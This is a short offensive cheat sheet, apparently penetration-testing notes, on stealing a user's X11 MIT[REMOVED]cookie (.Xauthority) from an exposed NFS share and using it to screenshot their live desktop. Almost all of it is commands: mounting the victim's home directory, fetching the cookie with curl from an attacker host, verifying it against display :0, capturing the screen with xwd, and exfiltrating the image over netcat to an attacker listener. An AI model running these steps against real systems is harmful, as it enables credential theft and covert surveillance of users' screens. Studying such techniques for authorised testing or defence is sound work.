# X11 Xauthority Cookie Theft → Screenshot

If an NFS share exposes another user's home directory containing `.Xauthority`, steal the MIT-magic-cookie and use it to take a screenshot of their active X session.

**Mount the NFS share and read the cookie:**
```bash
showmount -e <TARGET>
sudo mount -t nfs <TARGET>:/home/<USER> /mnt
ls -la /mnt/.Xauthority       # world-readable via NFS uid mismatch
```

**Transfer cookie to the target (via webshell/shell as low-priv user):**
```bash
curl http://<LHOST>/.Xauthority -o /tmp/.Xauthority
```

**Find the active display:**
```bash
w                              # shows :0 next to the logged-in username
who                            # alternative
```

**Verify cookie works:**
```bash
XAUTHORITY=/tmp/.Xauthority xdpyinfo -display :0
XAUTHORITY=/tmp/.Xauthority xwininfo -root -tree -display :0
```

**Take screenshot with xwd:**
```bash
XAUTHORITY=/tmp/.Xauthority xwd -root -screen -silent -display :0 > /tmp/screen.xwd
```

**Exfil and convert to PNG:**
```bash
# Exfil
cat /tmp/screen.xwd | nc <LHOST> 9009
# On attacker:
nc -lnvp 9009 > screen.xwd
convert screen.xwd screen.png
```
